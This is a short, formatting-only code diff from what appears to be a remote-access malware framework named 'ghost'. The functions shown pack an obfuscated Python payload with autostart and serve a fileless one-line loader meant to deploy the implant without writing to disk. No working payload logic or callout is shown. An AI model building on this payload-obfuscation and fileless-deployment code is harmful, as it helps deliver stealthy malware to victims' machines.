@@ -17,7 +17,6 @@ from ghost.ghostlib.utils.obfuscate import compress_encode_obfs
 from ghost.ghostlib.payloads import dependencies
 from ghost.ghostlib import ROOT
 
-
 def getLinuxImportedModules():
     lines = ''
 
@@ -25,7 +24,6 @@ def getLinuxImportedModules():
         lines = f.read()
 
     return lines
-
 
 def pack_py_payload(target, display, conf, autostart=True, purepy=True):
     display(Success('Generating PY payload ...'))
@@ -56,7 +54,6 @@ def pack_py_payload(target, display, conf, autostart=True, purepy=True):
 
     return compress_encode_obfs(payload, main=True)
 
-
 def serve_payload(display, server, payload, link_ip=None):
     if not server:
         display(Error('Oneliners only supported from ghostsh'))
@@ -79,5 +76,5 @@ def serve_payload(display, server, payload, link_ip=None):
         ),
     ], caption=Success(
         'Copy/paste this one-line loader to deploy ghost '
-        'without writing on the disk')
-    ))
+        'without writing on the disk'
+    )))
